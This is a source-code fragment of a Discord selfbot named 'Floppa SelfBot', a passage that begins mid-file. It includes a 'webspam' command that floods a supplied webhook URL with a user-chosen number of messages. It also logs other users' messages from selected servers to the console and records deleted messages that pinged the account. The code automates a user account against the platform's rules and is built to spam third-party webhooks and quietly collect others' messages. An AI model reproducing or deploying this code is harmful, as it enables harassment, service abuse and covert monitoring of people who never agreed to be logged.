                embeds: [embed],

            }).catch(err => {
                console.log(error + "Invalid webhook")
            }).then(console.log(infoSucces));


        }

        //---------------------------------//
        /**********     webspam    ***********/
        //---------------------------------//

        if (message.content.startsWith(`${prefix}webspam`)) {
            message.delete()
            let invalid = new Discord.RichEmbed()
                .setAuthor("Floppa SelfBot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setDescription("Invalid command usage, try using it like: \n``;webspam [number] [webhookURL] (message)``\n\nArguments: \n``number:`` Number of time you want to send message\n`webhookURL:` URL of the webhook you want to spam (https://discord.com/api/webhooks/xxxxxxxx/XXXXXXXXXXXXX)\n``message:`` Message you want to send.")
                .setFooter("Requested by " + message.author.tag, message.author.displayAvatarURL)
                .setTimestamp();

            number = args[0]
            if (isNaN(args[0])) {
                message.channel.send(invalid).catch(err => {
                    console.log(errorExec)
                }).then(msg => {
                    msg.delete(5000)
                });
                return;
            }

            webhook = args[1].split("/")
            if (!args[1]) {
                message.channel.send(invalid).then(msg => {
                    msg.delete(5000)
                });
                return;
            }
            messages = args.slice(2).join(" ")
            if (!messages) messages = `Spammed by ${sname} v${floppaversion} :)`


            if (!webhook[5] && webhook[6]) {
                message.channel.send(invalid).catch(err => {
                    console.log(errorExec)
                }).then(msg => {
                    msg.delete(5000)
                });
                return;
            }
            const webhookClient = new Discord.WebhookClient(webhook[5], webhook[6]);

            const embed = new Discord.RichEmbed()
                .setTitle(messages)
                .setColor('#2ECC71');

            for (let i = 0; i < number; i++) {

                webhookClient.send('', {
                    username: "Floppa Webhook Spammer :)",
                    avatarURL: 'https://i.imgur.com/Hcylg0h.png',
                    embeds: [embed],

                }).catch(err => {
                    console.log(error + "Invalid webhook")
                })
            }
            console.log(infoSucces);

        }






    })

    bot.on("message", message => {
        if (message.channel.type === "dm") return;
        const error = (timestamp) + red("[ERROR] ")
        const info = (timestamp) + yellow("[INFO] ")
        const log = (timestamp) + blueBright("[LOG] ")
        const warn = (timestamp) + redBright("[WARN] ")
        const gserver = "[" + message.guild.name + "] "
        const gchannel = "[" + message.channel.name + "] "
        const gauthor = "[" + message.author.tag + "] "




        if (messagelogger) {
            if (messageloggerGuild.includes(message.guild.id)) {
                if (message.embed) gcontent = "(embed)"
                else gcontent = message.content
                console.log(log + gserver + gchannel + gauthor + ": " + gcontent)
            }

        }


    })


    bot.on("messageDelete", message => {
        var hours = (new Date()).getHours();
        var minutes = (new Date()).getMinutes();
        if (minutes < 10) minutes = ("0" + (new Date()).getMinutes());
        var seconds = (new Date()).getSeconds();
        if (seconds < 10) seconds = ("0" + (new Date()).getSeconds());


        if (message.author.id === bot.user.id) return;

        timestamp = "[" + hours + ":" + minutes + ":" + seconds + "] "
        const error = (timestamp) + red("[ERROR] ")
        const info = (timestamp) + yellow("[INFO] ")
        const log = (timestamp) + blueBright("[LOG] ")
        const warn = (timestamp) + redBright("[WARN] ")
        const ghostping = (timestamp) + blueBright("[GHOSTPING] ")
        const gserver = "[" + message.guild.name + "] "
        const gchannel = "[" + message.channel.name + "] "
        const gauthor = "[" + message.author.tag + "] "
        const gcontent = message.content


        /*if (message.channel.type === "dm") {
            console.log('\n╔═════════════════════════════════╗')
            console.log('Log:') ^
                console.log('╟─────────────────────────────────')
            console.log(`║--> 1 message mp surppimé \n║--> User: ${message.author.tag}\n║--> Content: ${message.content}\n║--> At: ${message.createdAt}`)
            console.log('╚═════════════════════════════════╝')
        }*/
        if (message.content.includes("<@!" + bot.user.id + ">")) {
            if (message.author.id === bot.user.id) return;
            if (message.channel.type === "dm") return;
            console.log(ghostping + gserver + gchannel + gauthor + ": " + gcontent)
            /*console.log('\n╔═════════════════════════════════╗')
            console.log('Log:') ^
                console.log('╟─────────────────────────────────')
            console.log(`║--> New ghostping \n║--> serveur: ${message.guild.name} \n║--> channel: ${message.channel.name} \n║--> User: ${message.author.tag}\n║--> Content: ${message.content}\n║-->At: ${message.createdAt}`)
            console.log('╚═════════════════════════════════╝')*/
        }
        if (message.content.includes('@everyone') || message.content.includes('@here')) {
            if (message.author.id === bot.user.id) return;
            if (message.channel.type === "dm") return;
            console.log(ghostping + gserver + gchannel + gauthor + ": " + gcontent)
            /*console.log('\n╔═════════════════════════════════╗')
            console.log('Log:') ^
                console.log('╟─────────────────────────────────')
            console.log(`║--> New ghostping \n║--> serveur: ${message.guild.name} \n║--> channel: ${message.channel.name} \n║--> User: ${message.author.tag}\n║--> Content: ${message.content}\n║-->At: ${message.createdAt}`)
            console.log('╚═════════════════════════════════╝')*/
        } else return
    })





    process.stdin.resume();

    /*process.on('SIGINT', () => {
        function exit() {
            process.exit(0)
        }

        const exitembed = new Discord.RichEmbed()
            .setAuthor(`${bot.user.username}#${bot.user.discriminator} disconnected.`, `${bot.user.displayAvatarURL}`)
            .setDescription(`\`UserID\` : ${bot.user.id}`)
            .setColor("#ff0000")
            .setTimestamp();
        webhookClient.send('', {
            username: "Floppa Selfbot Logger.",
            avatarURL: 'https://i.imgur.com/Hcylg0h.png',
            embeds: [exitembed],
        })
        setTimeout(exit, 500)

    });

    process.on('exit', () => {
        function exit() {
            process.exit(0)
        }

        const exitembed = new Discord.RichEmbed()
            .setAuthor(`${bot.user.username}#${bot.user.discriminator} disconnected.`, `${bot.user.displayAvatarURL}`)
            .setDescription(`\`UserID\` : ${bot.user.id}`)
            .setColor("#ff0000")
            .setTimestamp();
        webhookClient.send('', {
            username: "Floppa Selfbot Logger.",
            avatarURL: 'https://i.imgur.com/Hcylg0h.png',
            embeds: [exitembed],
        })
        setTimeout(exit, 500)

    });
    process.on('SIGUSR1', () => {
        function exit() {
            process.exit(0)
        }

        const exitembed = new Discord.RichEmbed()
            .setAuthor(`${bot.user.username}#${bot.user.discriminator} disconnected.`, `${bot.user.displayAvatarURL}`)
            .setDescription(`\`UserID\` : ${bot.user.id}`)
            .setColor("#ff0000")
            .setTimestamp();
        webhookClient.send('', {
            username: "Floppa Selfbot Logger.",
            avatarURL: 'https://i.imgur.com/Hcylg0h.png',
            embeds: [exitembed],
        })
        setTimeout(exit, 500)

    });
    process.on('SIGUSR2', () => {
        function exit() {
            process.exit(0)
        }

        const exitembed = new Discord.RichEmbed()
            .setAuthor(`${bot.user.username}#${bot.user.discriminator} disconnected.`, `${bot.user.displayAvatarURL}`)
            .setDescription(`\`UserID\` : ${bot.user.id}`)
            .setColor("#ff0000")
            .setTimestamp();
        webhookClient.send('', {
            username: "Floppa Selfbot Logger.",
            avatarURL: 'https://i.imgur.com/Hcylg0h.png',
            embeds: [exitembed],
        })
        setTimeout(exit, 500)

    });
    process.on('uncaughtException', () => {
        function exit() {
            process.exit(0)
        }

        const exitembed = new Discord.RichEmbed()
            .setAuthor(`${bot.user.username}#${bot.user.discriminator} disconnected.`, `${bot.user.displayAvatarURL}`)
            .setDescription(`\`UserID\` : ${bot.user.id}`)
            .setColor("#ff0000")
            .setTimestamp();
        webhookClient.send('', {
            username: "Floppa Selfbot Logger.",
            avatarURL: 'https://i.imgur.com/Hcylg0h.png',
            embeds: [exitembed],
        })
        setTimeout(exit, 500)

    });
    process.on('SIGTERM', () => {
        function exit() {
            process.exit(0)
        }

        const exitembed = new Discord.RichEmbed()
            .setAuthor(`${bot.user.username}#${bot.user.discriminator} disconnected.`, `${bot.user.displayAvatarURL}`)
            .setDescription(`\`UserID\` : ${bot.user.id}`)
            .setColor("#ff0000")
            .setTimestamp();
        webhookClient.send('', {
            username: "Floppa Selfbot Logger.",
            avatarURL: 'https://i.imgur.com/Hcylg0h.png',
            embeds: [exitembed],
        })
        setTimeout(exit, 500)

    });



*/
})